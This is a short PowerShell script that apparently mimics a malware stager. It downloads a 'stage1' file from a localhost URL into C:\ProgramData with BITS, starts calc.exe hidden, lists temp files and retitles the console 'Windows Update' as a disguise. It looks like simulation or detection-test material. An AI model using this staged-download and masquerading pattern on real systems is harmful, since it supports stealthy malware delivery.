
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://localhost:9001/stage1.ps1',
    [string]$Stage2Path = 'C:\ProgramData\stage1.bin',
    [int]$ConnectionTimeout = 13
)
Start-BitsTransfer -Source $DownloadUrl -Destination $Stage2Path
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$Host.UI.RawUI.WindowTitle = "Windows Update"
